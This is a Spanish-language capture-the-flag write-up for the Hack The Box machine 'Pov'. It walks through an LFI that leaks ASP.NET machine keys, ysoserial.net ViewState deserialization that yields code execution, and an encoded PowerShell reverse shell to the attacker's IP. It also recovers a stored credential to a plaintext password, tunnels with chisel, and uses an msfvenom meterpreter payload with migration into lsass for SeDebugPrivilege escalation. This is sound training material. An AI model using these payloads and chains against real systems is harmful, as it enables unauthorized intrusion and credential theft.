---
tags:
title: Pov - Medium(HTB)
permalink: /Pov-HTB-Writeup
toc_label: Topics
toc: true
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
nmap -sCV -p80 10.129.230.183                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 19:30 -03
Nmap scan report for pov.htb (10.129.230.183)
Host is up (0.51s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.74 seconds
```

# Service enumeration

### HTTP / Port 80

![{6BE414D2-2194-4C03-B7DE-8903530CD569}](images/{6BE414D2-2194-4C03-B7DE-8903530CD569}.png)

En la web casi no hay nada de contenido interesante del cual nos podamos aprovechar, salvo el nombre de un usuario que podemos anotarlo y meterlo en un archivo llamado `users`.

### Gobuster Enumeration

#### Directorios y archivos

```bash
gobuster dir -u http://pov.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,aspx,php,txt -o gobuster-80.txt -t 100
```

```bash
/Index.html           (Status: 200) [Size: 12330]
/css                  (Status: 301) [Size: 142] [--> http://pov.htb/css/]
/img                  (Status: 301) [Size: 142] [--> http://pov.htb/img/]
/index.html           (Status: 200) [Size: 12330]
/js                   (Status: 301) [Size: 141] [--> http://pov.htb/js/]
```

No vemos directorios ni archivos interesantes.

![{9F6381E4-4A7E-4ABE-8A0A-55003833C899}](images/{9F6381E4-4A7E-4ABE-8A0A-55003833C899}.png)

### Subdomain enumeration with Wfuzz

```bash
wfuzz -c -t 200 -H "Host: FUZZ.pov.htb" -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw=834
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz''s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://pov.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000019:   302        1 L      10 W       152 Ch      "dev"
```

Vemos un subdomnio de la pagina, por lo que lo agregamos al `/etc/hosts`, para poder ver el contenido de la pagina

![{34D3E3CA-E7DC-427A-A5A9-F04B74316805}](images/{34D3E3CA-E7DC-427A-A5A9-F04B74316805}.png)

Vemos que alparecer la web es un `portfolio` de `sfitz`, donde mas abajo aparece la siguiente imagen.

![image-303](images/image-303.png)

Vemos que hay un boton de descarga, interceptemos la solicitud con `burpsuite`.

![image-3](images/image-3.png)

Vemos que por `POST` se envian varios datos, entre ellos el parametro `file` donde se indica el archivo a descargar, Sera un posible `LFI`?, ademas hay un parametro que parece indicar la accion que debe realizar y dos parametros interesantes, `__VIEWSTATE` y `__VIEWSTATEGENERATOR`. 

>`__VIEWSTATE` es un campo donde se almacenan los datos de una pagina en forma serealizada, donde los valores que contiene se ven reflejados en la pagina.

Buscando en [internet](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret?ref=benheater.com) vemos que hay una forma de abuse de una `Insecure Deserealization` de forma que si logramos enviar una data serealizada maliciosa.

Para eso debemos obtener las `keys` de encriptacion y desencriptacion con la que se deserealizan y serializan los datos.

#### LFI 

![{0117700A-E768-4023-AE00-5E5883A189FA}](images/{0117700A-E768-4023-AE00-5E5883A189FA}.png)

Vemos que insertando un simple payload como `../` para intentar ver el `/etc/hosts` vemos que con exito lo logramos, y como sabemos luego de una busqueda el archivo `web.config` es el que contiene las llaves que necesitamos.


![{18F235EB-5C59-4E0E-995C-859E9B2D8E57}](images/{18F235EB-5C59-4E0E-995C-859E9B2D8E57}.png)

Viendo el archivo es ahi donde se encuentran las claves que necesitamos para enviar y crear nuestro payload malicioso.

```xml
<configuration>

  <system.web>

    <customErrors mode="On" defaultRedirect="default.aspx" />

    <httpRuntime targetFramework="4.5" />

    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />

  </system.web>

    <system.webServer>

        <httpErrors>

            <remove statusCode="403" subStatusCode="-1" />

            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />

        </httpErrors>

        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />

    </system.webServer>

</configuration>
```

Para poder crear nuestra data serealizada usamos [ysoserial.net](https://github.com/pwntester/ysoserial.net/releases?ref=benheater.com) 
Una vez clonamos el repositorio, instalamos dependencias para no tenes riesgo de las mismas o que nuestro comando falle.

#### Instalacion de las dependencias de wine

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install -y wine wine32:i386 winetricks mono-complete
```

#### Instalacion de wine-mono

```bash
sudo apt install mono-complete
```

Ademas por temas de compilacion y depencias tambien tenemos que instalar las librerias de `.NET`.

```bash
winetricks dotnet48
```

Una vez hecho esto ya podemos pasar a la creacion de nuestro payload, y para ver el comportamiento de este vamos a crear uno que envie trazas `icmp`, a nuestra `IP` para ver si tenemos respuesta.

```bash
LD_PRELOAD= wine ./ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-c "ping 10.10.17.19" \
--path="/portfolio/default.aspx" --apppath="/" \
--decryptionalg="AES" \
--decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
--validationalg="SHA1" \
--validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
```

```c#
wQP0zFYvaBlUGVkjHobwjTJcKZEVYJiuZsXJ6xfS0YBJJXJmTNQ1ZPWJuD4%2Fwn2kflnx4cP%2Fa7sgDI1bqoz%2BUB%2Bo0J9ikv1RhTdVXZlEBpox85dsXfOUZ4wEqDW8wER8x0O%2FNcOq%2BtpxlTOLqRjnKkFS1z3mB2%2BgUs%2FIMmqgSj8R7s7hx8zYQn6bXbJt5Uu%2B%2Fy79B65%2FTb3fxioQc9Zns5OZytvH7OkQ1S%2Fp0KTL3EPpT1noNGxoOJo3luHUmq06IYo4eugp8RcuoMZbiAwWAyJmN98rChhRRwfalPDrsPUcGkVEffKIxNIYemcw0Kx107gBXAQU2Dn8PKevtPrF%2FcNiZEurUAFlrGaOqQCO3eRIw9kvs4wfJSiQ1GIKtY%2Fjs5hP4J39eFSskwXMiPH4NCisutTFZksgF4t9CIk6OpRZqA%2BIf9D1CWIqmXbHHnMl3FV2dKQjDszCejzlFTuT324eZ5Na1o%2BOTL%2B0Asf7tbsG2whFJTcxL9J1TpIIZrqRdlyqir2wt9tOurCz6tknJR3TBXwZdgg7pOO0TxDxR8dy0YwSskLaJz6meKyXAttmaJQZOP931dpgOLjFgkJOkJaohQKnXjjtm0RINjCm1MTwLRXJ%2Fquxwmrrsko2NejYb5UEvyfw7HCy33inY7kRc7yG%2FmWyMoBh89Vpd5%2Bj4tY%2BbeRbY4sykbyQztUET%2BaHklrqf9tuXFI%2BVbFXPKX1LV2kWIs7hSQSe2CJQGorO5FQxsI6TdVkRWhE%2FcUZKM24riGmrKoXKz1%2FQ7EmaxwNSS%2FseavtP4TnJCbOOxQVkAiO%2BXcjVmGzyECeCYbb0jRS4UkHliqEhHXcZTZ4SxSMv83jhm5quvIjgDJ26exD22oLI%2FBeKAjDxYcFNTUxqiM5Obri2jwAIBltS5wqryQFzE9alg%2Bqdo%2Bznw1zk51QUeABpF62VhjCgHPxmhjJwi1OC9Ns%2F0w8rC2OTYZ30jLmB6XBXcAppZtu0HLX4CwG46ABb%2F7GcXuO4DTKvXdgrhH4b8O7yST5JfdwF1wNDXC5cq71Jet21MZ7SeNpJtMLrbtUIawf6Lc5dAR3A9R2MTx2qgZWYDVp%2FZyCRgyN8WVyA%2B%2FKUTVHd4qoJs3r%2FSSPhfIjfbPr1kSPCwdjJJaoKZIMV6VTU2rT3tOaQvXLmnvTURFCe37L4PL5GnxQltj9OWsb%2F17q4zLXO9VhBHRYRMj5gZNcgvvAR4Zw3gcXADkppNlEiWPm5WijvR4UdKTOIRBzh4oIhkZA4k5Cg84o5HqLiK70gV3681Z6LnW%2BOfNEhuCFnes%3D
```

|**Parte del Comando**|**Descripción**|**Función dentro del Contexto de Explotación**|
|---|---|---|
|**`LD_PRELOAD=`**|Es una variable de entorno de Linux. Al establecerla como vacía, se asegura que **no se cargue ninguna librería compartida** de forma anticipada.|En algunos entornos de explotación o para evitar conflictos de librerías al ejecutar Wine, puede ser necesario limpiar esta variable.|
|**`wine`**|Es el cargador de compatibilidad que permite ejecutar aplicaciones de Windows en Linux.|Se utiliza para ejecutar el archivo ejecutable de Windows (`.exe`) de la herramienta `ysoserial`.|
|**`./ysoserial.exe`**|Es la herramienta `ysoserial.net`, una utilidad popular en pruebas de penetración para generar cargas útiles (payloads) de deserialización.|Es el ejecutable principal que crea la carga útil maliciosa.|
|**`-p ViewState`**|Especifica el **formato o tipo de carga útil** a generar. `ViewState` se refiere al mecanismo de administración de estado en las páginas web ASP.NET.|La carga útil se empaquetará de manera que parezca un `ViewState` legítimo, pero contendrá el comando malicioso.|
|**`-g TextFormattingRunProperties`**|Especifica el **gadget de deserialización** que se utilizará. Los gadgets son clases legítimas de .NET que, cuando se deserializan, ejecutan código arbitrario.|Este es el "vector de ataque" que fuerza la ejecución del comando.|
|**`-c "ping 10.10.17.19"`**|Especifica el **comando del sistema operativo** que deseas ejecutar de forma remota en el servidor objetivo.|En este caso, el comando intenta hacer un `ping` a la dirección IP `10.10.17.19`, lo que se usa comúnmente para **verificar la ejecución de código (RCE)** y confirmar que el ataque ha funcionado.|
|**`--path="/portfolio/default.aspx"`**|Especifica la **ruta relativa** del archivo ASPX objetivo que será explotado.|Indica dónde se generará el `ViewState` con la carga útil.|
|**`--apppath="/"`**|Especifica la **ruta de la aplicación web** en el servidor IIS/ASP.NET.|Ayuda a la herramienta a calcular correctamente las claves de cifrado y validación.|
|**`--decryptionalg="AES"`**|Especifica el **algoritmo de descifrado** que la aplicación web objetivo está utilizando para `ViewState`.|Este es un dato crucial que debe coincidir con la configuración del servidor web para que la carga útil sea aceptada.|
|**`--decryptionkey="..."`**|Especifica la **clave de descifrado** (o `DecryptionKey`) utilizada por la aplicación web.|Sin esta clave (que a menudo se busca o se filtra), el servidor no podrá descifrar y procesar el `ViewState` malicioso.|
|**`--validationalg="SHA1"`**|Especifica el **algoritmo de validación** (hash) que la aplicación web objetivo está utilizando para `ViewState`.|Al igual que con el descifrado, debe coincidir con la configuración del servidor.|
|**`--validationkey="..."`**|Especifica la **clave de validación** (o `ValidationKey`) utilizada por la aplicación web.|Esta clave se usa para calcular la firma criptográfica de la carga útil, asegurando que el servidor la considere auténtica.|

Una vez tenemos nuestro payload, iniciamos `tcpdump`para ver si nos llegan las trazas a nuestra maquina.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Y ahora el payload que generamos lo colocamos en el campo `__VIEWSTATE`.

![image-center](/assets/images/Untitled 84.jpg)

Y luego de unos segundos..

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:21:16.433274 IP pov.htb > 10.10.17.19: ICMP echo request, id 1, seq 5, length 40
22:21:16.433301 IP 10.10.17.19 > pov.htb: ICMP echo reply, id 1, seq 5, length 40
22:21:17.508705 IP pov.htb > 10.10.17.19: ICMP echo request, id 1, seq 6, length 40
22:21:17.508722 IP 10.10.17.19 > pov.htb: ICMP echo reply, id 1, seq 6, length 40
22:21:18.172037 IP pov.htb > 10.10.17.19: ICMP echo request, id 1, seq 7, length 40
22:21:18.172090 IP 10.10.17.19 > pov.htb: ICMP echo reply, id 1, seq 7, length 40
```

## Shell as sfitz
Una vez viendo que tenemos una ejecucion remota de comandos, podemos enviarnos una `Reverse shell` a nuestra maquina, asi que preparamos nuestro listener.

```bash
rlwrap -cAr nc -nlvp 4444
```

Y con la ayuda de la pagina de [revshells.com](https://www.revshells.com/), generamos el comando en `Powershell` que nos envia la shell a nuestra maquina.


```bash
LD_PRELOAD= wine ./ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" \
--path="/portfolio/default.aspx" --apppath="/" \
--decryptionalg="AES" \
--decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
--validationalg="SHA1" \
--validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 2>/dev/null | sed 's/\n//g'
```

```BASH
OuG669K27XKmzUHMwHmkSoYC4x%2FTJi4Tpuix25693k3Yd2C9WqAp5xhLf5gsn4dUSbvccFikeUbpWh5vKjvmptN8AxebzRZqAofy%2FtYMFob481RAcDe7PR8bq0vl2EfNbSc2Xq%2Fj4IyGJiMpA2iifzCiaocyBDnpCHRdm%2FZ7kgqvWHS6pfJ0QzCqCOPfQeeDs%2FA5t7qRPz2bdnv4XDJOw8caSPiZZYoaQ89Ea1fZTPK4mGdYw5UGwOmI4RIT0tq%2Fzl%2FCghmPo1wuc4QID7rSRSY2je3JKsLd6Azx%2BPGR1I9W1h2rpK9YLozPl92VtklrPgUlHdy7g9CK%2F%2FqvXseL1MWFWl3%2FxdMcJvp1ZKSYMHwGfzZBY7eZ6%2Bsa%2BmHZ9fMWL1sxGtK%2B8vXPchRfoUwtHteEYRTflyjf0x1Y%2FiynhyCzMzMEFnm6pPg6tz9m%2BMVxG6vypkW8h8n54o%2FF8BdBUg8WNQpD7jKrFrWuytmyEioJo8kwhdBUZENaYMY8589fxoo9mW0owWi6%2FQo5ku8w3F4uSR1ecnePYBWbqzYnxA3RNo6ABaZUrFpdLIRj66ZE0mJd5WieWUNLufd%2Fwell6U8lk4Oxq9cfourYUDM%2BCIRD1IQmpp1xABpJ8bOUqmbFHPfM0j%2F81YE4z0oRaoUl95s8cXxRExf7STWNBSKjx24ascLLxIq%2FEapfb%2F2jVf2iGvfNvfFLqE%2BzIQqFB51Jy0zqFusWND6f3Ol6hXwU5pdJUIVsPwSCPntPnIMegTl94QDPZNCcPAIIPNUg8742oAhYHiWOAAydiFd8HHam9u10%2FzoefLRzuWi%2Bk4FnfZd%2F%2F%2B6e9aYeXonmlgP5gOwT6vyjgcvqmvXFHDmbzrmn9s8mDLqGYDoS3vGzFQPhn81NLGY%2FlhX1%2Bvd31NRGxMgwp%2BN1yX0qbz6hfh7fCBj1AfyQtbG1UaaRzGy2QDBmI%2F7ZPWgMcLTpm%2B%2BYcN2uOSwSxTH4s%2FWNoNZEQ%2BwixvILGkmDD1XBf4P4iTaLiLG1zWW4IOxFSK%2FXMb3IJl5uP6wp2jNaYeJEkvKvBHPCSKevjDL%2FP3257L0C%2B9ULNd53f77nmXnClGrZC%2F9CPOGd28yqbEZ%2Bz%2FfqqdvlqtMJkcGTUZTYv1zYyHSx12rdCEsGmYNZM%2BJDOit8jW5b8t%2FLvDPMJBgZ2Zm%2FV2k8reCfl1siKd2rfVrvavozzv2qemGXw%2B%2BT1pcjyXMQUFwcO0P2sLd3IPKFbgRUoLVnFunvsA4EvWYPOvxyGq1nMfQcljKq%2B8hzKOeQOta4IswhadA8a%2FZbmuMOTNiaC3CT6ucc2vVPBnfuTpss36%2BiOKkYPf34AvvuVgPIRKVZCqbC0z5MezUs%2BVG%2B69BWXBqiVHwQ45I6I7xGZnlWFkiIjc%2BYdWUiJrIU5qMJTI7GUo6VLJHvGxESoAsJeud%2FpiNr1114gPYAhpECLm3V7RFDDDb7X9A3mdhnZblTSEoqX1PxfXue2x8oeDxuJ25oqkSGXpaGYwOckr52v0aqAOEaBO63br%2FvM9%2B%2BQ%2FPJ%2Fo69kKdrwebpJB1VhnXrahLe4%2FJ3SjMuLy8z%2FecGZIZ2FCSU352Av%2BZ50x9a4WyiD5nK%2FOyRbRxkpI%2FBgW4LgSppeZ2X9cjyClBQwbzt6EjyenehE8cRb%2BaAHi3SAyxxL3CKgx7b699vwbvMcITDA7HtnZyLWswMcCviy%2B0eN5ofyUHe%2BZlzX1yoZ7Q4QorCSABfHUABewOLCazcFuar7LhP0HF0xHiB26EITAwwVd9%2ByP%2FJ0c6eBT0pXRhAgnyxtXFuUXtRstbL4Q%2BjhJyhfEz237sj%2F92GoaYnhBCvM2xuJuHx5F6TAcv8vxLIJf6xHPx4kArpKk071oFCMA3R0ioHoTMlpvbLHkBEqDe67p%2B9eQwUMMKVtIs9eF3ZtQigtm46uau3lW3xTfHw3YY0b9Yx4AOfLdR%2Bo%2FIK4ylu2LerNbuXe0XkL3lxQYC%2FX24%2FyeGRa2oaEChC86lZWti22Ecxr5woEx2wuzrjV6xiZycZJoh8BMpE75OiLAJfMeRen01M48ieH820EXxUxF7h26ycqf2qybENZCtDZj2kJXEjIWrFDj0ANuKZ58FGATGP8tqARk8uZ9XPK9PXO0hT%2BW0dxwKCQUKehuhkpPSfF3bLSjIQa9Q8mXAylgQ388lfxkCxzWf5fIv5VK%2FU23hxzrdMiLTs%2FrGe1AxunRxloq0Gc0fEDrncimfvFwI%2BRsk%2FBK32ZwIUguXeX%2BNqMV5TcwoavwTLfANvslpFMd%2Fo8DEa8lGBTyiTnBaAGEN%2F6DovIqGJ8ea2piJRG6T%2FJF9CaBVgpe9%2B%2B2gOGvN0VbG07hMMtAYS3Vfz4%2BkqJ9Ogo%2BGpCLQ2zAEhWN4aLQZxxRwNIpg5b8kJO%2BF94VsU3JPD0YolEmY6Dda3%2FazChCa2V0TUtPBq8XTcD2VHxMf2uNxM%2B%2BB4TL%2Bm4F53VQPo8gPx2msqZucZjUqzA98kqIiknlFfBSurSztMNvb4FqR0Yo2G8nlZAdFeH7WvQuO0SphKQ7Z8kML2nLfICAmjnBQCoAxZ6erd18AVqMMOoycCfX4QPYVs8bFGbs40Et1NlfGcTlfrkLVsbU0Zmgae4vsjufZme%2FQxe%2B8f2l53fQXGp4INnm%2BSNFlaCjP3LKBA3fW1mzVgmdQzk8M3f6tW2Fhamvpoi39tBxBjLsuJfAgCC6qAxrGKnC4oCiA%2F7DW2TGUF9yWbt8stskkEzBTAMwOOFDCo3a8z1ImHuP2%2Fe7xJ7%2FNmiya%2BxF%2BXmSS5gx3y6mUFufDu22zwDnEXxo9X35ZyKbntRT8j0uO8vnDVJBeSH5wMXr9FaTixvjQ1RqUsMGISRKlniELRw9zln4j9q%2B165bj42I5oPf7FAjffXguB17WE0UoY4lI6ajJ%2BXAabRzoJzOaKze9ePZzPJgMzs6YKzu3kgIYeqSLYLg10OueGa4iJlHVmcsID%2FLEkVDh9OHkimfVHBjW3wKebF%2FPBazgsDbgmbmf5QWuIlfveTvVvFUwQ4VIhXUD%2F28zpPC3FydEqc5WNm7pENS9cnwI1O%2F6T%2FXab3w%3D%3D
```

Enviamos el payload..

![image-center](/assets/images/Untitled 85.jpg)

Y com podemos ver recibimos nuestra shell como el usuario `sfitz`.

## Shell as alaading

### Enumeration 

#### Local Port Forwarding.
Como vimos en el escaneo de `nmap`, solamente estaba abierto el puerto que nos llevaba a la pagina web, por lo que seguramente hayan mas puertos abiertos a nivel local.

```powershell
PS C:\users\sfitz\documents> netstat -ano 

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       868
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1028
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1400
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       640
  TCP    10.129.246.59:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.246.59:49671    10.10.17.19:4444       ESTABLISHED     5056
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       868
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       476
  TCP    [::]:49665             [::]:0                 LISTENING       1028
  TCP    [::]:49666             [::]:0                 LISTENING       1400
  TCP    [::]:49667             [::]:0                 LISTENING       620
  TCP    [::]:49668             [::]:0                 LISTENING       640
  UDP    0.0.0.0:123            *:*                                    2380
  UDP    0.0.0.0:5353           *:*                                    1416
  UDP    0.0.0.0:5355           *:*                                    1416
  UDP    10.129.246.59:137      *:*                                    4
  UDP    10.129.246.59:138      *:*                                    4
  UDP    127.0.0.1:60293        *:*                                    2680
  UDP    [::]:123               *:*                                    2380
  UDP    [::]:5353              *:*                                    1416
  UDP    [::]:5355              *:*                                    1416
```

Vemos varios de los puertos que usualmente estan abierto pero esta vez solo estan abiertos a nivel local, por lo que con el uso de `chisel`, los exponemos para que luego desde nuestra maquina podamos jugar con `proxychains` para acceder a los mismos.

#### Creds for alaading
Ademas podemos ver en el directorio personal de `sfitz` hay un archivo `.xml`.

```powershell
PS C:\users\sfitz> dir documents


    Directory: C:\users\sfitz\documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        


PS C:\users\sfitz> cd documents
PS C:\users\sfitz\documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

Como vemos contiene unas credenciales exportadas en `powershell`, para el usuario `alaading`, asi que haciendo uso del mismo powershell, realizamos el proceso inverso para ver que password es.

```powershell
PS C:\users\sfitz\documents> powershell -c "(Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml').GetNetworkCredential().Password"
f8gQ8fynP44ek1m3
```

Credenciales de `alaading`: `f8gQ8fynP44ek1m3`

Una vez teniendo las claves de `alaading` podemos hacer uso de `RunasCs.exe` para poder obtener una shell o bien usar `chisel` para abrir los puertos que remotamente no estan expuesto y ademas poder conectarnos por `evil-winrm` directamente y asi matar dos pajaros de un tiro.
#### Chisel download

```powershell
PS C:\users\sfitz\documents> wget http://10.10.17.19:8888/chisel.exe -Outfile C:\ProgramData\chisel.exe
```

Ahora desde nuestra maquina ejecutamos `chisel`, en modo servidor para luego desde nuestra maquina nos conectemos en modo cliente para poder tener acceso a los puertos locales que de nuestro lado no estan expuestos.

Desde nuestra maquina
```bash
./chisel server -p 5555 --reverse
```

Y ahora de la maquina victima.

```bash
.\chisel.exe client 10.10.17.19:5555 R:socks
```

Ahora si podemos desde nuestra maqina conectarnos con las credenciales de `alaading`.

```bash
proxychains evil-winrm -i 10.129.246.59 -u alaading -p f8gQ8fynP44ek1m3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.246.59:5985  ...  OK
*Evil-WinRM* PS C:\Users\alaading\Documents>
```

## Shell as administrator

#### Recon

Listando privilegios vemos lo siguiente.

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> whoami /priv
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.246.59:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.246.59:5985  ...  OK

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Vemos el famoso `SeDebugPrivilege`, usando el metodo tradicional para abusar de este privilegio, vamos a ver que sin exito podemos dumpear los datos que guarda `lsass.dump` por lo que otra manera de abusar del mismo es con metasploit, Por lo que generamos un `payload.exe` para luego obtener una shell en nuestra consola de `metasploit`.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.17.19 LPORT=443 -f exe -o payload.exe
```

Y ahora nos configuramos nuestra consola.

```bash
sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > run
```

Una vez hecho esto y teniendo el payload en la maquina victima lo ejecutamos.

```powershell 
*Evil-WinRM* PS C:\Users\alaading\Documents> .\payload.exe
```

Y desde nuestro lado recibimos nuestra shell.

```powershell 
meterpreter > 
```


Ahora necesitamos listar proceso que corran con maximos privilegios para asi mover y reinyectar la DLL a un proceso diferente.

Listamos procesos.

```powershell
meterpreter > ps  
  
Process List  
============  
  
 PID   PPID  Name               Arch  Session  User          Path  
 ---   ----  ----               ----  -------  ----          ----  
<SNIP>  
 640   472   lsass.exe       x64   1                      C:\Windows\System32\lsass.exe  
</SNIP>
```

Y ahora usando el `PID` que es el identificador de cada proceso migramos la `DLL`.

```powershell
meterpreter > migrate 640  
[*] Migrating from 1164 to 640...  
[*] Migration completed successfully.  
  
meterpreter > shell  
Process 3380 created.  
Channel 1 created.  
